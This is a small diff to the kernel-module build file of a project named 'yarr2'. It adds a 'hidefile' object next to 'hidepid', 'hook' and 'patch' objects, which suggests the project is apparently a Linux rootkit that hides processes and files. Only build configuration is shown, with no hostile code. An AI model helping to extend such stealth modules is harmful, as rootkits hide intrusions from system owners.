@@ -2,9 +2,10 @@ obj-m := yarr2.o
 yarr2-objs := \
     utils.o \
     patch.o \
-    hidepid.o \
-    yarrcall.o \
     hook.o \
+    hidepid.o \
+    hidefile.o \
+    yarrcall.o \
     main.o
 
 ccflags-y := -DDEBUG -ggdb -O0
